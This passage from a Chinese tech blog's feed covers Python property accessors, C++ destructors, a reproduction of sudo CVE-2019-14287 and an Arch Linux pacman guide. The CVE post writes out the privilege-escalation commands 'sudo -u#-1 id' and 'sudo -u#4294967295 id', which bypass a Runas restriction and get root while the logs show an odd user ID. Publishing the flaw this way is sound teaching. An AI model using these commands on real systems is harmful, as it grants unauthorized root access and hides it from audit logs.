class="comment">#定义对私有属性的get方法，获取私有属性</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getAge</span><span class="params">(<span class="keyword">self</span>)</span></span><span class="symbol">:</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">self</span>.__age</span><br><span class="line"></span><br><span class="line">    <span class="comment">#定义对私有属性的重新赋值的set方法，重置私有属性</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">setAge</span><span class="params">(<span class="keyword">self</span>,age)</span></span><span class="symbol">:</span></span><br><span class="line">        <span class="keyword">self</span>.__age = age</span><br><span class="line"></span><br><span class="line">person1 = Person(<span class="string">"tom"</span>,<span class="number">19</span>)</span><br><span class="line">person1.setAge(<span class="number">20</span>)</span><br><span class="line">print(person1.name,person1.getAge())  <span class="comment">#tom 20</span></span><br></pre></td></tr></table></figure><p>7.2) <strong>调用property方法提供私有属性的访问</strong></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(<span class="keyword">self</span>, name, age)</span></span><span class="symbol">:</span></span><br><span class="line">        <span class="keyword">self</span>.name = name</span><br><span class="line">        <span class="keyword">self</span>.__age = age</span><br><span class="line"></span><br><span class="line">    <span class="comment">#定义对私有属性的get方法，获取私有属性</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getAge</span><span class="params">(<span class="keyword">self</span>)</span></span><span class="symbol">:</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">self</span>.__age</span><br><span class="line"></span><br><span class="line">    <span class="comment">#定义对私有属性的重新赋值的set方法，重置私有属性</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">setAge</span><span class="params">(<span class="keyword">self</span>,age)</span></span><span class="symbol">:</span></span><br><span class="line">        <span class="keyword">self</span>.__age = age</span><br><span class="line"></span><br><span class="line">    p = property(getAge,setAge) <span class="comment">#注意里面getAge,setAge不能带()</span></span><br><span class="line"></span><br><span class="line">s1 = Student(<span class="string">"jack"</span>,<span class="number">22</span>)</span><br><span class="line">s1.p = <span class="number">23</span> <span class="comment">#如果使用=,则会判断为赋值，调用setAge方法。</span></span><br><span class="line">print(s1.name,s1.p)  <span class="comment">#jack 23   ，直接使用s1.p会自动判断会取值，调用getAge</span></span><br><span class="line">print(s1.name,s1.getAge()) <span class="comment">#jack 23,这个时候set,get方法可以单独使用。</span></span><br></pre></td></tr></table></figure><p>7.3) <strong>使用property标注提供私有属性的访问</strong></p><p>注意： 一旦给函数加上一个装饰器@property,调用函数的时候不用加括号就可以直接调用函数了 </p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Teacher</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(<span class="keyword">self</span>, name, age,speak)</span></span><span class="symbol">:</span></span><br><span class="line">        <span class="keyword">self</span>.name = name</span><br><span class="line">        <span class="keyword">self</span>.__age = age</span><br><span class="line">        <span class="keyword">self</span>.__speak = speak</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    @property      <span class="comment">#注意1.<span class="doctag">@proterty</span>下面默认跟的是get方法，如果设置成set会报错。</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">age</span><span class="params">(<span class="keyword">self</span>)</span></span><span class="symbol">:</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">self</span>.__age</span><br><span class="line"></span><br><span class="line">    @age.setter    <span class="comment">#注意2.这里是使用的上面函数名.setter，不是property.setter.</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">age</span><span class="params">(<span class="keyword">self</span>,age)</span></span><span class="symbol">:</span></span><br><span class="line">        <span class="keyword">if</span> age &gt; <span class="number">150</span> <span class="keyword">and</span> age &lt;=<span class="number">0</span>:  <span class="comment">#还可以在setter方法里增加判断条件</span></span><br><span class="line">            print(<span class="string">"年龄输入有误"</span>)</span><br><span class="line">        <span class="symbol">else:</span></span><br><span class="line">            <span class="keyword">self</span>.__age = age</span><br><span class="line"></span><br><span class="line">    @property</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">for_speak</span><span class="params">(<span class="keyword">self</span>)</span></span>:  <span class="comment">#注意2.这个同名函数名可以自定义名称，一般都是默认使用属性名。</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">self</span>.__speak</span><br><span class="line"></span><br><span class="line">    @for_speak.setter</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">for_speak</span><span class="params">(<span class="keyword">self</span>, speak)</span></span><span class="symbol">:</span></span><br><span class="line">        <span class="keyword">self</span>.__speak = speak</span><br><span class="line"></span><br><span class="line">t1 = Teacher(<span class="string">"herry"</span>,<span class="number">45</span>,<span class="string">"Chinese"</span>)</span><br><span class="line">t1.age = <span class="number">38</span>    <span class="comment">#注意4.有了property后，直接使用t1.age,而不是t1.age()方法了。</span></span><br><span class="line">t1.for_speak = <span class="string">"English"</span>  </span><br><span class="line"></span><br><span class="line">print(t1.name,t1.age,t1.for_speak)  <span class="comment">#herry 38 English</span></span><br></pre></td></tr></table></figure><hr><h2 id="C-面向对象编程"><a href="#C-面向对象编程" class="headerlink" title="C++面向对象编程"></a>C++面向对象编程</h2><blockquote><p>引用：</p><p><a href="https://www.cnblogs.com/wpbing/p/9774818.html" target="_blank" rel="noopener">c++面向对象程序设计总结(类的使用)</a></p><p><a href="https://www.runoob.com/cplusplus/cpp-classes-objects.html" target="_blank" rel="noopener">C++ 类 &amp; 对象</a></p><p><a href="https://blog.csdn.net/u012940886/article/details/80381398" target="_blank" rel="noopener">C++面向对象基础</a></p></blockquote><h4 id="析构函数"><a href="#析构函数" class="headerlink" title="析构函数"></a>析构函数</h4><p>析构函是类的一个成员函数，名字由波浪号接类名构成。它没有返回值，也不接受参数：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Foo</span>&#123;</span> </span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">      ~Foo();   <span class="comment">//析构函数</span></span><br><span class="line">      <span class="comment">//...</span></span><br><span class="line">  &#125;;</span><br></pre></td></tr></table></figure><p>由于析构函数不接受参数，因此它不能被重载。对于一个给定类，只会由唯一一个析构函数。</p><p>在一个构造函数中，成员的初始化时在函数体执行之前完成的，且按照它们在类中出现的顺序进行初始化。在一个析构函数中，首先执行函数体，然后销毁成员。成员按初始化顺序的逆序进行销毁。</p><p>无论何时一个对象被销毁，就会自动调用其析构函数：</p><blockquote><p>​    1.变量在离开其作用域时被销毁<br>​    2.当一个对象被销毁时，其成员被销毁<br>​    3.容器(无论是标准容器还是数组)被销毁时，其元素被销毁<br>​    4.对于动态分配的对象，当对指向它的指针应用delete运算符时被销毁<br>​    5.对于临时对象，当创建它的完整表达式结束时被销毁</p></blockquote><blockquote><blockquote><blockquote><p>未完待续</p></blockquote></blockquote></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2019-14287</title>
      <link href="/2019/10/18/CVE-2019-14287/"/>
      <url>/2019/10/18/CVE-2019-14287/</url>
      
        <content type="html"><![CDATA[<blockquote><p>引用：</p><p><a href="https://www.sudo.ws/alerts/minus_1_uid.html" target="_blank" rel="noopener">Potential bypass of Runas user restrictions  (sudo official page)</a></p><p><a href="https://www.freebuf.com/vuls/217089.html" target="_blank" rel="noopener">CVE-2019-14287：sudo权限绕过漏洞分析与复现</a></p><p><a href="http://baijiahao.baidu.com/s?id=1647516935984812975&amp;wfr=spider&amp;for=pc" target="_blank" rel="noopener">Linux Sudo暴userID提权漏洞CVE-2019-14287</a></p><p><a href="https://www.jianshu.com/p/8cbebd4e429a" target="_blank" rel="noopener">sudo 用法简介</a></p></blockquote><p>第一次复现CVE漏洞，十分滴激动</p><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>Sudo 的全称是“superuserdo”，它是Linux系统管理指令，允许用户在不需要切换环境的前提下以其它用户的权限运行应用程序或命令。通常以 root 用户身份运行命令，是为了减少 root 用户的登录和管理时间，同时提高安全性。</p><p>2019年10月14日，Sudo官方发布了Sudo 1.8.28版本，其中包含sudo root权限绕过漏洞（CVE-2019-14287）的补丁修复。</p><h3 id="利用前提"><a href="#利用前提" class="headerlink" title="利用前提"></a>利用前提</h3><ol><li>sudo -v &lt; 1.8.28</li><li>知道当前用户的密码</li><li>当前用户存在于sudo权限列表</li></ol><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>复现是在sudo 1.8.16的版本下进行的，对于低于1.8.28的版本都起作用</p><p><img src="https://magic-king.net/images/loading.gif" data-original="CVE-2019-14287\sudoers_1.jpg" alt></p><p><img src="https://magic-king.net/images/loading.gif" data-original="CVE-2019-14287\sudo_1.jpg" alt></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">testALL=(ALL,!root)/usr/bin/id</span><br></pre></td></tr></table></figure><p>其中，在sudoers配置中，以上语句代表着test用户，ALL=(ALL,!root)代表指定用户，即所有除root以外的用户都可运行命令<code>/usr/bin/id</code></p><p> 一般情况下，大多数Linux发行版的Runas规范（/etc /sudoers）都如下图（第三张图）所示，其中定义的ALL关键字将允许admin或sudo组中的用户以目标系统中的任意用户身份来运行命令 </p><p>如果想利用该漏洞来实施攻击，用户需要拥有sudo权限，并允许用户使用任意用户ID来运行命令（如下图中定义了test用户可用id命令，但不能以root用户执行命令id（<code>test  ALL=(ALL,!root) /usr/bin/id</code>））。通常来说，这意味着用户的sudoer项在Runas规范中定义了特殊的ALL值。如果sudoer策略允许的话，sudo支持由用户指定的用户名或用户ID来运行命令。</p><p>如果sudoer条目允许用户以任意用户身份运行命令（非root），那么攻击者就可以利用该漏洞来绕过这种限制了。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo -u<span class="comment">#-1 id</span></span><br><span class="line">sudo -u<span class="comment">#4294967295 id</span></span><br></pre></td></tr></table></figure><p>上述命令运行之后，将返回“0”。这是因为sudo命令本身已经在以用户ID“0”运行了，所以当sudo尝试将用户ID修改为“-1”时，不会发生任何变化。</p><p>但是，sudo日志条目中记录下的命令运行用户的ID为“4294967295”，而并非root用户（或用户ID为“0”），除此之外，因为用户ID是通过-u选项指定的，并且不会在密码数据库中存储，所以PAM会话模块也不会运行。</p><p><img src="https://magic-king.net/images/loading.gif" data-original="CVE-2019-14287\sudoers.jpg" alt></p><p><strong>漏洞片段</strong></p><p><img src="https://magic-king.net/images/loading.gif" data-original="CVE-2019-14287\sudo_2.jpg" alt></p><p><img src="https://magic-king.net/images/loading.gif" data-original="CVE-2019-14287\sudo_3.jpg" alt></p><p> 漏洞CVE-2019-14287的源于sudo调用的系统函数setresuid()和setreuid()在参数处理中会将 -1（或其等效的无符号整数4294967295）误认为是 0，而这正好是 root 用户的UserID 。 </p><p>实际上，只要用户的权限足够高，即拥有最高sudo权限的用户，并且在Runas规范中定义了ALL关键字的话，他们就可以运行Runas规范中明确禁止使用的那些root命令，而且以这种方式运行的命令其日志项所显示的目标用户为4294967295，而不是root。与此同时，在执行相应命令的过程中，PAM会话模块将不会运行。</p>]]></content>
      
      
      <categories>
          
          <category> CVE </category>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE </tag>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pacman</title>
      <link href="/2019/10/11/pacman/"/>
      <url>/2019/10/11/pacman/</url>
      
        <content type="html"><![CDATA[<h1 id="包管理工具-Pacman"><a href="#包管理工具-Pacman" class="headerlink" title="包管理工具 Pacman"></a>包管理工具 Pacman</h1><blockquote><p>参考：</p><p><a href="https://www.archlinux.org/pacman/" target="_blank" rel="noopener">Pacman Home Page</a></p><p><a href="[https://wiki.archlinux.org/index.php/Pacman_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87">pacman wiki</a>](<a href="https://wiki.archlinux.org/index.php/Pacman_(简体中文)" target="_blank" rel="noopener">https://wiki.archlinux.org/index.php/Pacman_(简体中文)</a>)</p><p><a href="https://blog.csdn.net/lu_embedded/article/details/50520647" target="_blank" rel="noopener">ArchLinux 的 pacman 命令详解</a></p></blockquote><hr><p><strong>警告:</strong> 在Arch下安装软件包时，未<a href="https://wiki.archlinux.org/index.php/Pacman_(简体中文" target="_blank" rel="noopener">更新</a>#升级软件包)系统前，<strong>不要</strong>更新软件包数据库（例如，可能出现某软件包不再出现在官方库）。操作时，应使用<code>pacman -Syu *package_name*</code>, 而不要使用（<code>pacman -Sy *package_name*</code>），否则可能会有依赖问题。参见 <a href="https://wiki.archlinux.org/index.php/System_maintenance_(简体中文" target="_blank" rel="noopener">System maintenance (简体中文)#不支持部分升级</a>#不支持部分升级) 和 <a href="https://bbs.archlinux.org/viewtopic.php?id=89328" target="_blank" rel="noopener">BBS#89328</a>.</p><hr><h3 id="安装指定的包"><a href="#安装指定的包" class="headerlink" title="安装指定的包"></a>安装指定的包</h3><p>安装或者升级单个软件包，或者一列软件包（包含依赖包），使用如下命令：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pacman -S package_name1 package_name2 ...</span><br></pre></td></tr></table></figure><p>用正则表达式安装多个软件包（参见 <a href="https://wiki.archlinux.org/index.php/Pacman_tips_(简体中文" target="_blank" rel="noopener">pacman 小贴士</a>#巧用<em>Bash</em>语法): invalid section]和<a href="https://bbs.archlinux.org/viewtopic.php?id=7179" target="_blank" rel="noopener">这个帖子</a>）：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pacman -S $(pacman -Ssq package_regex)</span><br></pre></td></tr></table></figure><p>有时候在不同的软件仓库中，一个软件包有多个版本（比如[extra]和[testing]）。可以选择一个来安装：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pacman -S extra/package_name</span><br></pre></td></tr></table></figure><p>安装多个含有相似名称的软件包，而并非整个包组或全部匹配的软件包； 例如，plasma:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pacman -S plasma-&#123;desktop,mediacenter,nm&#125;</span><br></pre></td></tr></table></figure><p>当然，可以多层扩展，并不作限制：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pacman -S plasma-&#123;workspace&#123;,-wallpapers&#125;,pa&#125;</span><br></pre></td></tr></table></figure><h3 id="安装包组"><a href="#安装包组" class="headerlink" title="安装包组"></a>安装包组</h3><p>一些包属于一个可以同时安装的软件包组。例如，运行下面的命令</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pacman -S gnome</span><br></pre></td></tr></table></figure><p>会提醒用户选择 <code>gnome</code> 内需要安装的包。</p><p>有的包组包含大量的软件包，有时用户只需其中几个。除了逐一键入序号外，pacman 还支持选择或排除某个区间内的的软件包：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Enter a selection (default=all): 1-10 15</span><br></pre></td></tr></table></figure><p>这将选中序号 1 至 10 和 15 的软件包。而</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Enter a selection (default=all): ^5-8 ^2</span><br></pre></td></tr></table></figure><p>将会选中除了序号 5 至 8 和 2 之外的所有软件包。</p><p>想要查看哪些包属于 gnome 组，运行：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pacman -Sg gnome</span><br></pre></td></tr></table></figure><p>也可以访问 <a href="https://www.archlinux.org/groups/" target="_blank" rel="noopener">https://www.archlinux.org/groups/</a> 查看可用的包组。</p><p><strong>注意:</strong> 如果列表中的包已经安装在系统中，它会被重新安装，即使它已经是最新的。可以用                <code>--needed</code> 选项覆盖这种行为。</p><h3 id="删除软件包"><a href="#删除软件包" class="headerlink" title="删除软件包"></a>删除软件包</h3><p>删除单个软件包，保留其全部已经安装的依赖关系</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> pacman -R package_name</span></span><br></pre></td></tr></table></figure><p>删除指定软件包，及其所有没有被其他已安装软件包使用的依赖关系：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pacman -Rs package_name</span><br></pre></td></tr></table></figure><p>要删除软件包和所有依赖这个软件包的程序:</p><p><strong>警告:</strong> 此操作是递归的，请小心检查，可能会一次删除大量的软件包。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pacman -Rsc package_name</span><br></pre></td></tr></table></figure><p>要删除软件包，但是不删除依赖这个软件包的其他程序：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pacman -Rdd package_name</span><br></pre></td></tr></table></figure><p><em>pacman</em> 删除某些程序时会备份重要配置文件，在其后面加上*.pacsave扩展名。-n 选项可以避免备份这些文件：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pacman -Rn package_name</span><br></pre></td></tr></table></figure><p><strong>注意:</strong> <em>pacman</em> 不会删除软件自己创建的文件(例如主目录中的 <code>.dot</code> 文件不会被删除。</p><h3 id="升级软件包"><a href="#升级软件包" class="headerlink" title="升级软件包"></a>升级软件包</h3><hr><p><strong>警告:</strong> * 建议所有用户都<a href="https://wiki.archlinux.org/index.php/System_maintenance#Upgrading_the_system" target="_blank" rel="noopener">经常性的更新系统</a></p><ul><li>Arch 只支持系统完整升级，详细参见<a href="https://wiki.archlinux.org/index.php/System_maintenance#Partial_upgrades_are_unsupported" target="_blank" rel="noopener">不支持部分升级</a>和<a href="https://wiki.archlinux.org/index.php/Pacman_(简体中文" target="_blank" rel="noopener">#安装软件包</a>#安装软件包)。</li></ul><hr><p>一个 <em>pacman</em> 命令就可以升级整个系统。花费的时间取决于系统有多老。这个命令会同步非本地(local)软件仓库并升级系统的软件包：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pacman -Syu</span><br></pre></td></tr></table></figure><h3 id="查询包数据库"><a href="#查询包数据库" class="headerlink" title="查询包数据库"></a>查询包数据库</h3><p><em>pacman</em> 使用 <code>-Q</code> 参数查询本地软件包数据库。参见：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> pacman -Q --<span class="built_in">help</span></span></span><br></pre></td></tr></table></figure><p>使用 <code>-S</code> 参数来查询远程同步的数据库。参见：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pacman -S --<span class="built_in">help</span></span><br></pre></td></tr></table></figure><p><em>pacman</em> 可以在包数据库中查询软件包，查询位置包含了软件包的名字和描述：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pacman -Ss string1 string2 ...</span><br></pre></td></tr></table></figure><p>有时，<code>-s</code>的内置正则会匹配很多不需要的结果，所以应当指定仅搜索包名，而非描述或其他子段，下面的命令就会返回很多不必要结果:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pacman -Ss <span class="string">'^vim-'</span></span><br></pre></td></tr></table></figure><p>要查询已安装的软件包：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pacman -Qs string1 string2 ...</span><br></pre></td></tr></table></figure><p>按文件名查找软件库：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pacman -Fs string1 string2 ...</span><br></pre></td></tr></table></figure><p>显示软件包的详尽的信息：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pacman -Si package_name</span><br></pre></td></tr></table></figure><p>查询本地安装包的详细信息：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pacman -Qi package_name</span><br></pre></td></tr></table></figure><p>使用两个 <code>-i</code> 将同时显示备份文件和修改状态：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pacman -Qii package_name</span><br></pre></td></tr></table></figure><p>要获取已安装软件包所包含文件的列表：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pacman -Ql package_name</span><br></pre></td></tr></table></figure><p>查询远程库中软件包包含的文件：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pacman -Fl package_name</span><br></pre></td></tr></table></figure><p>检查软件包安装的文件是否都存在：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pacman -Qk package_name</span><br></pre></td></tr></table></figure><p>两个参数<code>k</code>将会执行一次更彻底的检查。 查询数据库获取某个文件属于哪个软件包：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pacman -Qo /path/to/file_name</span><br></pre></td></tr></table></figure><p>查询文件属于远程数据库中的哪个软件包：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> pacman -Fo /path/to/file_name</span></span><br></pre></td></tr></table></figure><p>要罗列所有不再作为依赖的软件包(孤立orphans)：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pacman -Qdt</span><br></pre></td></tr></table></figure><p>要罗列所有明确安装而且不被其它包依赖的软件包：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pacman -Qet</span><br></pre></td></tr></table></figure><p>要显示软件包的依赖树：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pactree package_name</span><br></pre></td></tr></table></figure><p>检查一个<em>安装</em>的软件包被那些包依赖，可以使用 <a href="https://aur.archlinux.org/packages/pkgtools/" target="_blank" rel="noopener">pkgtools</a>AUR中的<em>whoneeds</em>:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ whoneeds package_name</span><br></pre></td></tr></table></figure><p>或者<em>pactree</em>中使用<code>-r</code>:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pactree -r package_name</span><br></pre></td></tr></table></figure><h4 id="数据库结构"><a href="#数据库结构" class="headerlink" title="数据库结构"></a>数据库结构</h4><p>pacman数据库通常位于 <code>/var/lib/pacman/sync</code>. 对于每一个在<code>/etc/pacman.conf</code>中指定的软件仓库， 这里都有一个一致的数据库。数据库文件夹里每个tar.gz文件都包含着一个仓库的软件包信息。例如which 包:</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">% tree which<span class="number">-2.20</span><span class="number">-6</span> </span><br><span class="line">which<span class="number">-2.20</span><span class="number">-6</span></span><br><span class="line">|-- depends</span><br><span class="line">`-- desc</span><br></pre></td></tr></table></figure><p>这个 <code>depends</code> 项列出了该软件的依赖包， 而<code>desc</code>有该包的介绍，例如文件大小和MD5值 。</p><h3 id="清理软件包缓存"><a href="#清理软件包缓存" class="headerlink" title="清理软件包缓存"></a>清理软件包缓存</h3><p><em>pacman</em> 将下载的软件包保存在 <code>/var/cache/pacman/pkg/</code> 并且不会自动移除旧的和未安装版本的软件包，因此需要手动清理，以免该文件夹过于庞大。</p><p>使用内建选项即可清除未安装软件包的缓存：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pacman -Sc</span><br></pre></td></tr></table></figure><p><strong>警告:</strong></p><ul><li>仅在确定当前安装的软件包足够稳定且不需要<a href="https://wiki.archlinux.org/index.php/Downgrading_packages_(简体中文" target="_blank" rel="noopener">降级</a>)时才执行清理。<code>pacman -Sc</code>仅会保留软件包的当前有效版本，旧版本的软件包被清理后，只能从其他地方如 <a href="https://wiki.archlinux.org/index.php/Arch_Linux_Archive_(简体中文" target="_blank" rel="noopener">Arch Linux Archive (简体中文)</a>)中获取了。</li><li><code>pacman -Scc</code> 可以清理所有缓存，但这样 pacman 在重装软件包时就只能重新下载了。除非空间不足，否则不应这么做。</li></ul><p>由于以上种种局限，建议使用专门的脚本去处理清理哪些、清理多少缓存：</p><p><a href="https://www.archlinux.org/packages/?name=pacman-contrib" target="_blank" rel="noopener">pacman-contrib</a> 提供的 <em>paccache</em> 命令默认会删除近3个版本前的软件包</p><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># paccache -r</span></span><br></pre></td></tr></table></figure><p><strong>Tip:</strong> 可以使用 <a href="https://wiki.archlinux.org/index.php/Pacman_hooks" target="_blank" rel="noopener">pacman hooks</a> 自动执行清理，<a href="https://bbs.archlinux.org/viewtopic.php?pid=1694743#p1694743" target="_blank" rel="noopener">这里</a>是参考示例。</p><p>也可以自己设置保留最近几个版本：</p><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># paccache -rk 1</span></span><br></pre></td></tr></table></figure><p>清理所有未安装包的缓存文件，再此运行<code>paccache</code>:</p><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># paccache -ruk0</span></span><br></pre></td></tr></table></figure><p>更多功能参见<code>paccache -h</code>。</p><p><em>paccache</em>，还可以使用 <a href="https://wiki.archlinux.org/index.php/Arch_User_Repository_(简体中文" target="_blank" rel="noopener">Arch User Repository</a>) 中的 <a href="https://aur.archlinux.org/packages/pkgcacheclean/" target="_blank" rel="noopener">pkgcacheclean</a>AUR：</p><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># pkgcacheclean</span></span><br></pre></td></tr></table></figure><p>，以及<a href="https://aur.archlinux.org/packages/pacleaner/" target="_blank" rel="noopener">pacleaner</a>AUR，这两个是未来的替代工具.</p><h3 id="其它命令"><a href="#其它命令" class="headerlink" title="其它命令"></a>其它命令</h3><p>升级系统时安装其他软件包：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pacman -Syu package_name1 package_name2 ...</span><br></pre></td></tr></table></figure><p>下载包而不安装它：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pacman -Sw package_name</span><br></pre></td></tr></table></figure><p>安装一个<strong>本地</strong>包(不从源里下载）：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pacman -U /path/to/package/package_name-version.pkg.tar.xz</span><br></pre></td></tr></table></figure><p>要将本地包保存至缓存，可执行：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td 